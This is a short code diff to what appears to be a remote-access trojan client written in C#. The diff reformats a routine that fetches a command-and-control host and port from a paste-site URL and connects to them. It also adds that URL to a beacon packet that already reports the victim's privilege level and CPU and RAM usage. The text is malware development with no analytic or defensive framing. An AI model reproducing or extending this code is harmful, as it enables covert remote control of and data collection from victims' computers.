@@ -58,7 +58,7 @@ namespace Client.Sockets
                         string resp = wc.DownloadString(Settings.Pastebin);
                         string[] spl = resp.Split(new[] { ":" }, StringSplitOptions.None);
                         Settings.Hosts = spl[0];
-                        Settings.Ports = spl[new Random().Next(1,spl.Length)];
+                        Settings.Ports = spl[new Random().Next(1, spl.Length)];
                         Client.Connect(Settings.Hosts, Convert.ToInt32(Settings.Ports));
                     }
                 }
@@ -119,6 +119,7 @@ namespace Client.Sockets
             msgpack.ForcePathObject("Admin").AsString = new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator).ToString().ToLower().Replace("true", "Administrator").Replace("false", "User");
             TheCPUCounter.NextValue();
             msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
+            msgpack.ForcePathObject("Pastebin").AsString = Settings.Pastebin;
             return msgpack.Encode2Bytes();
         }
 
